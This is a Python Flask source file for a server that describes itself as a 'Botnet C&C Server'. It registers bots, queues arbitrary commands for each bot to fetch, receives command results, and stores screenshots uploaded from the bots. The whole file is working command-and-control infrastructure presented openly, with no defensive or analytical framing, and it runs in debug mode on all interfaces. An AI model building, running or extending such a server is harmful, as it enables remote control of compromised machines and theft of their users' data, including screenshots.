from flask import Flask, request, jsonify
from werkzeug.utils import secure_filename
import os
app = Flask(__name__)

# Dictionary to store commands for bots
commands = {}

@app.route('/initialize/sequence/0', methods=['GET'])
def initialize_sequence():
    # You can perform any necessary initialization here
    return jsonify({"message": "Initialization successful"}), 200

@app.route('/register', methods=['POST'])
def register_bot():
    bot_id = request.json.get('id')
    if not bot_id:
        return jsonify({"error": "No ID provided"}), 400
    commands[bot_id] = []  # Initialize an empty list for commands
    return jsonify({"message": "Bot registered", "id": bot_id}), 200

@app.route('/command/<bot_id>', methods=['POST'])
def add_command(bot_id):
    if bot_id not in commands:
        return jsonify({"error": "Bot not registered"}), 404
    command = request.json.get('command')
    if not command:
        return jsonify({"error": "No command provided"}), 400
    commands[bot_id].append(command)
    return jsonify({"message": "Command added"}), 200

@app.route('/get_commands/<bot_id>', methods=['GET'])
def get_commands(bot_id):
    print(f"Fetching commands for bot: {bot_id}")  # Debug print
    if bot_id not in commands:
        print("Bot not registered")  # Debug print
        return jsonify({"error": "Bot not registered"}), 404
    bot_commands = commands[bot_id]
    return jsonify(bot_commands), 200


@app.route('/result/<bot_id>', methods=['POST'])
def receive_result(bot_id):
    if bot_id not in commands:
        return jsonify({"error": "Bot not registered"}), 404
    result = request.json.get('result')
    if result is None:
        return jsonify({"error": "No result provided"}), 400
    print(f"Received result from {bot_id}: {result}")
    return jsonify({"message": "Result received"}), 200

@app.route('/upload_screenshot', methods=['POST'])
def upload_screenshot():
    file = request.files.get('file')
    if not file:
        return "No file uploaded", 400
    
    filename = secure_filename(file.filename)
    if not filename:
        return "Invalid file name", 400

    save_dir = "./screenshots"
    os.makedirs(save_dir, exist_ok=True)  # Ensure directory exists
    save_path = os.path.join(save_dir, filename)
    
    # Check for duplicates
    if os.path.exists(save_path):
        return "File already exists", 409

    file.save(save_path)
    return "Screenshot saved", 200

@app.route('/')
def home():
    return "Welcome to the Botnet C&C Server! Name: John Doe"
    


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
